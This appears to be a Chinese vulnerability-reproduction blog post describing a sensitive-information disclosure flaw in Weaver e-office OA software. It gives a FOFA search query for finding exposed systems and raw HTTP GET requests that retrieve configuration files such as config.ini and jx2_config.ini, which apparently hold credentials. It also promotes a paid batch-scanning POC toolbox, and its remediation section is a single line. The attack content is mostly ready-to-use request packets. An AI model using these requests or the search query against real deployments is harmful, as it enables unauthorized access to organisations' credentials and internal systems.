#  泛微e-office系统存在敏感信息泄露 附POC软件   
南风徐来  南风漏洞复现文库   2024-02-20 23:37  
  
@[toc]  
  
免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
## 1. 泛微e-office系统简介  
  
微信公众号搜索：南风漏洞复现文库 该文章 南风漏洞复现文库 公众号首发  
  
泛微e-office系统是标准、易用、快速部署上线的专业协同OA软件,国内协同OA办公领域领导品牌,致力于为企业用户提供专业OA办公系统、移动OA应用等协同OA整体解决方案。  
## 2.漏洞描述  
  
泛微e-office系统是标准、易用、快速部署上线的专业协同OA软件,该系统存在敏感信息泄露漏洞  
  
CVE编号:  
  
CNNVD编号:  
  
CNVD编号:  
## 3.影响版本  
  
泛微e-office  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3azGTPugr8SO2PHpGuJJ67IG2MK2kKjlfp4B3U6n7XbamALPghyEJcn9DEFaHef9gDPl6IOwsqrmQ/640?wx_fmt=jpeg&from=appmsg "null")  
  
泛微e-office系统存在敏感信息泄露  
## 4.fofa查询语句  
  
app="泛微-EOffice"  
## 5.漏洞复现  
  
漏洞链接： http://127.0.0.1/building/config/config.ini  
  
http://127.0.0.1/building/backmgr/urlpage/mobileurl/configfile/jx2_config.ini 漏洞数据包：  
```
GET /building/backmgr/urlpage/mobileurl/configfile/jx2_config.ini HTTP/1.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
Host: 127.0.0.1
Connection: close
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3azGTPugr8SO2PHpGuJJ67IdLvZqicPaRYQCYU53vMaacUnQJENaB6UJribqZ4d9xySHDSwHZLcGkOQ/640?wx_fmt=jpeg&from=appmsg "null")  
```
GET /building/config/config.ini HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Accept: */*
Connection: Keep-Alive
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3azGTPugr8SO2PHpGuJJ67IBNAt9BmhS1ZhZicepUTWOhKgSqZTtCT0ULWZnOy4xYxvFXF7s4QBSyQ/640?wx_fmt=jpeg&from=appmsg "null")  
## 6.POC&EXP  
  
本期漏洞及往期漏洞的批量扫描POC及POC工具箱已经上传知识星球：南风网络安全  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3azGTPugr8SO2PHpGuJJ67INn6d6kaY8qnCgyXydYABSdhDcNz2CbYQm2I37ibGD4popOHyAasKNfQ/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3azGTPugr8SO2PHpGuJJ67I0RhUppoO47W60tGYlATmhn2ZcjJyBMdem1l0SC95EwRepCVmxWGoOQ/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3azGTPugr8SO2PHpGuJJ67IGK9JmzFfIfFicL9wbRak90RSwyFRZmwhq0mdwvfc0ia8uQHDg0v8m6hg/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3azGTPugr8SO2PHpGuJJ67I5YGVxIGowibMqUflJ4wyYMmA1jGFMTpq0LfcYYILulZLkcHsQddxOaQ/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3azGTPugr8SO2PHpGuJJ67IuaDI8bPvzpaau5JNtpaJ4vWNlKkicGZpibeGic7WpoRPIr1n6Vs7ghJiaw/640?wx_fmt=jpeg&from=appmsg "null")  
## 7.整改意见  
  
请关注官网更新补丁: https://www.e-office.cn/  
## 8.往期回顾  
  
[亿赛通-数据泄露防护(DLP)44个接口存在远程命令执行漏洞 附POC软件](http://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247485256&idx=1&sn=70c20d907235e4fbf0b0e8ba53afe8e6&chksm=974b8a4fa03c03593bae16f80b3c580dd2e6512c5c54c26220990616e75ff69af0ae76ec677e&scene=21#wechat_redirect)  
  
  
[Panalog大数据日志审计系统libres_syn_delete.php存在命令执行漏洞 附POC软件](http://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247485242&idx=1&sn=4144bba6c8f989ea3f2b3da8a29f0ea4&chksm=974b8a3da03c032bf005a175afd5c89a4db4450f6623205b0551d7e6db8207a8a9713c82bed1&scene=21#wechat_redirect)  
  
  
  
  
